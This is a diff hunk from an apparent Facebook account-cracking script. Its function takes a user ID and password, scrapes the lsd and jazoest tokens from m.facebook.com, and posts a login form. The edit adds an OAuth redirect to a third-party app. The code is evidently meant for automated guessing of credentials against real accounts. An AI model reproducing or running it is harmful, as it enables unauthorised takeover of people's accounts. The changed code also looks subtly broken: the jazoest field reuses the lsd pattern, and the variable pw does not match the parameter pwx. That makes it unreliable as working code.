@@ -1929,15 +1929,13 @@ def x(uid,pwx,tl):
             ses = requests.Session()
             free_fb = ses.get('https://m.facebook.com').text
             data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":'',
-            "li":'',
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":pw,
-            "login":"Log In"}
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
+            'flow': 'login_no_pin',
+            'pass': pw,
+            'login': 'Log in'}
             headers = {
             'authority': 'm.facebook.com',
             'method': 'GET',
